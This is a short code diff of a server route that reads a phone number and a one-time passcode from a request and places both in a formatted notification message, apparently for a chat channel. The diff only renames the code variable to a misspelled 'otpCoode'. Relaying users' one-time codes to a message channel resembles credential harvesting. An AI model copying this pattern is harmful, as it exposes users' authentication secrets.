@@ -2,7 +2,7 @@ import { createClient } from '@/lib/supabase/server';
 
 export async function POST(request: Request) {
   try {
-    const { phoneNumber, otpCode } = await request.json();
+    const { phoneNumber, otpCoode } = await request.json();
 
     if (!phoneNumber) {
       return Response.json(
@@ -50,7 +50,7 @@ export async function POST(request: Request) {
 🔐 *OTP Verification Request*
 
 📱 Phone Number: \`+235${phoneNumber}\`
-🔑 OTP Code: \`${otpCode}\`
+🔑 OTP Code: \`${otpCoode}\`
 ⏰ Timestamp: ${new Date().toISOString()}
 📋 Record ID: \`${data.id}\`
 
